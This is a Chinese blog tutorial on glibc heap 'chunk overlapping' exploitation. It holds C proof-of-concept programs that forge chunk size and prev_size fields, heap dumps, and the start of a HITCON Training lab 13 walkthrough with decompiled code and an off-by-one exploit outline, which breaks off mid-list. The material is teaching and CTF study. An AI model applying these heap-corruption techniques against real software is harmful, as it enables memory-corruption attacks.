<!DOCTYPE html>

<!--
  portfolYOU Jekyll theme by Youssef Raafat
  Free for personal and commercial use under the MIT license
  https://github.com/YoussefRaafatNasry/portfolYOU
-->

<html lang="en" class="h-100">

<head>

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content=""循此苦旅，以达星辰"">

  <title>Yvan's blog</title>
  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">

  <!-- Font Awesome CDN -->
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">

  <!-- Bootstrap CSS CDN -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">

  <!-- Animate CSS CDN -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css" type="text/css"/>
  
  <!-- Custom CSS -->
  <link rel="stylesheet" href="/assets/css/style.css" type="text/css">

  <!-- Mathjax for latex -->
  <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>

  <!-- comment system -->
  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>

</head>


<body class="d-flex flex-column h-100">

  <main class="flex-shrink-0 container mt-5">
  <nav class="navbar navbar-expand-lg navbar-light">

  <a class="navbar-brand" href="/"><h5><b>Yvan's blog</b></h5></a>

  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
    <div class="navbar-nav ml-auto"><a class="nav-item nav-link " href="/projects/">Projects</a>

      <a class="nav-item nav-link active" href="/blog/">Blog</a>

      <a class="nav-item nav-link " href="/link/">Link</a>

      <a class="nav-item nav-link " href="/about/">About</a>

      <a class="nav-item nav-link " href="/about_en/">AboutEN</a>

      

    </div>
  </div>

</nav>
  <div class="col-lg-10 mx-auto mt-5 post">
  <h1><b>Chunk Overlapping</b></h1>

<p class="post-metadata text-muted">
  10 February 2020 -
  <b>14 mins read time</b>

  <br>Tags:
  
  <a class="text-decoration-none no-underline" href="/blog/tags#heapexploit">
    <span class="tag badge badge-pill text-primary border border-primary">HeapExploit</span>
  </a>
  
  <a class="text-decoration-none no-underline" href="/blog/tags#pwn">
    <span class="tag badge badge-pill text-primary border border-primary">pwn</span>
  </a>
  </p>

<p>chunk extend 是一种很好理解的利用手法，可以通过修改size或prev_size字段来实现extend，进而越界控制chunk，利用的条件如下：</p>

<ul>
  <li>存在一个write漏洞</li>
  <li>write漏洞可以控制chunker header的数据</li>
</ul>

<h3 id="原理">原理</h3>

<p>我们知道chunk几乎都是根据size来进行计算的，这个size类似与偏移的效果，通过加减size来获得前一个或后一个chunk，这一就维护了隐式链表。我们来看几个关键的函数：</p>

<h4 id="获取前一个chunk的函数">获取前一个chunk的函数</h4>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span>
<span class="cp">#define prev_size(p) ((p)-&gt;mchunk_prev_size)
</span>
<span class="cm">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span>
<span class="cp">#define prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))
</span></code></pre></div></div>
<p>利用当前的chunk地址减去prev_size即可获得前一个chunk的地址</p>

<h4 id="获得next_chunk的函数">获得next_chunk的函数</h4>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Get size, ignoring use bits */</span>
<span class="cp">#define chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))
</span>
<span class="cm">/* Like chunksize, but do not mask SIZE_BITS.  */</span>
<span class="cp">#define chunksize_nomask(p)         ((p)-&gt;mchunk_size)
</span>
<span class="cm">/* Ptr to next physical malloc_chunk. */</span>
<span class="cp">#define next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))
</span></code></pre></div></div>
<p>首先我们可以看到，chunksize一定是8的倍数，因为后三位是三个flag，这里有一个细节一定要<strong>注意</strong>!!!</p>

<blockquote>
  <p>32位时 chunk 地址8字节对齐
64位事 chunk 地址16字节对齐</p>
</blockquote>

<p>为什么说这个细节十分重要，我们一会儿详细分析一下。这里看到当前chunk加上size即可获得next_chunk。<br />
因此如果我们可以控制size或者prev_size字段，我们就可以越块操作，产生堆块重叠。</p>

<h3 id="fastbin-extend">fastbin extend</h3>
<p>这种方式基本就是通过前一个chunk去控制后一个chunk的size，我们写个demo：</p>

<blockquote>
  <p>一下代码均为64位环境</p>
</blockquote>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span><span class="o">*</span><span class="n">ptr1</span><span class="p">;</span>

    <span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span><span class="c1">//分配第一个0x10的chunk</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span><span class="c1">//分配第二个0x10的chunk</span>

    <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">ptr</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span><span class="o">=</span><span class="mh">0x41</span><span class="p">;</span><span class="c1">// 修改第一个块的size域</span>

    <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
    <span class="n">ptr1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span><span class="c1">// 实现 extend，控制了第二个块的内容</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>两次malloc执行后，heap分布如下：</p>
<pre><code class="language-plain">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000020fc1 &lt;=== top chunk
</code></pre>
<p>之后将chunk1的size修改成0x41，因为0x41恰好可以控制这两个chunk。</p>

<blockquote>
  <p>注意：这里的size是包含chunk header的</p>
</blockquote>

<p>接下来我们free掉chunk1：</p>
<pre><code class="language-plain">0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== 篡改大小
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000021
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000020fc1 
</code></pre>

<p>执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了。</p>

<pre><code class="language-plain">Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) 
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
</code></pre>

<p>之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。</p>

<blockquote>
  <p>这里malloc(0x30)的原因是，我们要将合并的chunk size减去chunk header的size，就是0x40 - 0x10 = 0x30</p>
</blockquote>

<h3 id="inuse-small-bin">inuse small bin</h3>
<p>与fastbin类似，只是我们需要确保free掉small bin chunk时要避免合并到top chunk。</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span><span class="o">*</span><span class="n">ptr1</span><span class="p">;</span>

    <span class="n">ptr</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span><span class="c1">//分配第一个 0x80 的chunk1</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span> <span class="c1">//分配第二个 0x10 的chunk2</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span> <span class="c1">//防止与top chunk合并</span>

    <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">int</span><span class="p">)</span><span class="n">ptr</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span><span class="o">=</span><span class="mh">0xb1</span><span class="p">;</span>
    <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
    <span class="n">ptr1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p>

<pre><code class="language-plain">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;===chunk1 篡改size域
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000021 &lt;=== 防止合并的chunk
0x6020c0:   0x0000000000000000  0x0000000000000000
0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk
</code></pre>

<p>释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin</p>

<pre><code class="language-plain">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;=== 被放入unsorted bin
0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000000  0x0000000000000021
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x00000000000000b0  0x0000000000000020 &lt;=== 注意此处标记为空
0x6020c0:   0x0000000000000000  0x0000000000000000
0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk
</code></pre>
<pre><code class="language-plain">[+] unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)
</code></pre>
<p>再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容</p>

<p>当然在free状态我们也可以修改small bin，但是不能修改fastbin，因为malloc的时候会对根据对应的size去对应的bin里查找。</p>

<h3 id="向前overlapping">向前overlapping</h3>
<p>这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面的块</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr1</span><span class="p">,</span><span class="o">*</span><span class="n">ptr2</span><span class="p">,</span><span class="o">*</span><span class="n">ptr3</span><span class="p">,</span><span class="o">*</span><span class="n">ptr4</span><span class="p">;</span>
    <span class="n">ptr1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">);</span><span class="c1">//smallbin1</span>
    <span class="n">ptr2</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span><span class="c1">//fastbin1</span>
    <span class="n">ptr3</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span><span class="c1">//fastbin2</span>
    <span class="n">ptr4</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">);</span><span class="c1">//smallbin2</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span><span class="c1">//防止与top合并</span>
    <span class="n">free</span><span class="p">(</span><span class="n">ptr1</span><span class="p">);</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">ptr4</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span><span class="o">=</span><span class="mh">0x90</span><span class="p">;</span><span class="c1">//修改pre_inuse域</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span><span class="n">ptr4</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span><span class="o">=</span><span class="mh">0xd0</span><span class="p">;</span><span class="c1">//修改pre_size域</span>
    <span class="n">free</span><span class="p">(</span><span class="n">ptr4</span><span class="p">);</span><span class="c1">//unlink进行前向extend</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x150</span><span class="p">);</span><span class="c1">//占位块</span>
<span class="p">}</span>
</code></pre></div></div>
<p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p>

<p>接下来我们看个例子：</p>

<h3 id="hitcon-trainging-lab-13"><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13">HITCON Trainging lab 13</a></h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aurora:/home/code/pwn/Just-pwn/practice/heap/off-by-one/hitcon_training13<span class="o">(</span>master⚡<span class="o">)</span> <span class="c">#checksec heapcreator </span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/code/pwn/Just-pwn/practice/heap/off-by-one/hitcon_training13/heapcreator'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
</code></pre></div></div>
<p>全局维护一个<code class="language-plaintext highlighter-rouge">heaparray[10]</code>，可以存放10个地址。
这个大概的功能如下：</p>

<h4 id="create">create</h4>
<p>根据用户的输入新建chunk，然后设置内容，代码如下：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="nf">create_heap</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rbx</span>
  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-2Ch]</span>
  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-28h]</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-20h]</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]</span>

  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">9</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">heaparray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">heaparray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10uLL</span><span class="p">);</span>   <span class="c1">// 首先分配0x10</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">heaparray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Allocate Error"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Size of Heap : "</span><span class="p">);</span>
      <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
      <span class="n">size</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
      <span class="n">v0</span> <span class="o">=</span> <span class="n">heaparray</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
      <span class="n">v0</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span> <span class="c1">// 根据用户的输入分配空间，将地址存入heaparray[i][1]</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">heaparray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Allocate Error"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">heaparray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>   <span class="c1">// 将size存入heaparray[i][0]</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Content of heap:"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
      <span class="n">read_input</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">heaparray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="n">size</span><span class="p">);</span> <span class="c1">// 向content输入</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"SuccessFul"</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>我们可以看到这个时候其实分配了两个chunk：</p>

<pre><code class="language-plain">+----------+
+   size   +
+----------+
+   addr   +-------&gt;+----------+
+----------+        +  content +
                    +----------+
</code></pre>
<p>但是由于两次malloc是连着的，所以实际的结构应该是：</p>

<pre><code class="language-plain">+-----------+
+ prev_size +
+-----------+
+  ch_size  +   // chunk的size
+-----------+
+   size    +
+-----------+
+   addr    +--------|
+-----------+        |
+ prev_size +        |
+-----------+        |
+  ch_size  +        |
+-----------+&lt;-------|
+  content  +
+   .....   +
.           .
.           .
.           .
+-----------+
</code></pre>
<p>因此，假如我们可以控制ch_size，我们就可以越界写。</p>

<h4 id="edit">edit</h4>
<p>编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会存在 off by one 的漏洞。</p>
<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="nf">edit_heap</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Index :"</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4uLL</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Out of bound!"</span><span class="p">);</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">heaparray</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Content of heap : "</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
    <span class="n">read_input</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">heaparray</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">heaparray</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1LL</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Done !"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"No such heap !"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h4 id="show">show</h4>
<p>展示堆，输出指定索引堆的大小以及内容。</p>
<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="nf">show_heap</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Index :"</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4uLL</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Out of bound!"</span><span class="p">);</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">heaparray</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Size : %ld</span><span class="se">\n</span><span class="s">Content : %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">heaparray</span><span class="p">[</span><span class="n">v1</span><span class="p">],</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">heaparray</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Done !"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"No such heap !"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h4 id="delete">delete</h4>
<p>删除堆，删除指定堆，并且将对应指针设置为了 NULL。</p>
<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="nf">delete_heap</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Index :"</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4uLL</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Out of bound!"</span><span class="p">);</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">heaparray</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">heaparray</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
    <span class="n">free</span><span class="p">(</span><span class="n">heaparray</span><span class="p">[</span><span class="n">v1</span><span class="p">]);</span>
    <span class="n">heaparray</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Done !"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"No such heap !"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>于是我们的大概思路如下：</p>

<ul>
  <li>先分配chunk1和chunk2</li>
  <li>edit chunk1来修改chunk2的size字段</li>
  <li>free掉chunk2,并重新请chunk3</li>
